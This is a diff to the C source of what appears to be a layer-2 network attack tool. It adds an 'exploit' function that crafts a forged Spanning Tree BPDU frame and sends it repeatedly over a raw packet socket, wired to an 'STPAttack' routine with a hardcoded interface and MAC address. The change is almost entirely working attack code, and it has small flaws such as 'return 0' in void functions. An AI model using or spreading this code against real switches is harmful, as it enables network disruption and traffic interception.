@@ -97,6 +97,10 @@ static u_int8_t valid_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 
 #include <signal.h>
 
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+
+
 /*
  * Initial command line arguments parser.
  * Return -1 on error. Return 0 if Ok.
@@ -170,12 +174,60 @@ void arpflooder()
    return 0;
 }
 
+void exploit(char* interface, unsigned char* evilmac) {
+
+  unsigned char packet[] =  {
+    0x01, 0x80, 0xc2, 0x00, 0x00, 0x00,   //multicast addr 
+    0x00, 0x0c,0x29, 0xea, 0x22, 0x7e, //source addr 
+    0x00, 0x26,
+    0x42, 0x42,
+    0x03, 0x00, 0x00, 0x02, 0x00, 0x3c, 0x00, 0x01,
+    0x00, 0x0c, 0x29, 0xea, 0x22, 0x7e, 0x00, 0x00,
+    0x00, 0x01, 0x00, 0x01, 0x00, 0x0c, 0x29, 0xea,
+    0x22, 0x7e, 0x00, 0x01, 0x01, 0x00, 0x14, 0x00,
+    0x02, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00};
+
+    // create a raw socket
+    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (sockfd < 0) {
+        perror("socket");
+        exit(1);
+    }
+
+    // set the interface 
+    struct sockaddr_ll destaddr = {0,};
+    destaddr.sll_family = AF_PACKET;
+    destaddr.sll_ifindex = if_nametoindex(interface);
+    destaddr.sll_halen = 6;
+    memcpy(destaddr.sll_addr, evilmac, 6);
+
+    // send the packet
+    for (;;) {
+        ssize_t sent = sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destaddr, sizeof(destaddr));
+        if (sent < 0) {
+            perror("sendto");
+            exit(1);
+        }
+
+        printf("Packet sent", sent);
+        //sleep for two seconds to avoid flooding 
+        sleep(2);
+        //TODO add system interupt
+
+    }
+
+    // clean up
+   close(sockfd);
+}
+
 void STPAttack()
 {
    printf("STP Attack Starting...\n");
+   unsigned char mac[] = {0x00, 0x0c, 0x29, 0xea, 0x22, 0x7e} ;
+   exploit("ens33", mac);
+   return 0;
 }
-
-
 
 int8_t
 parser_initial(struct term_tty *tty, struct cl_args *cl_args, int argc, char **argv)
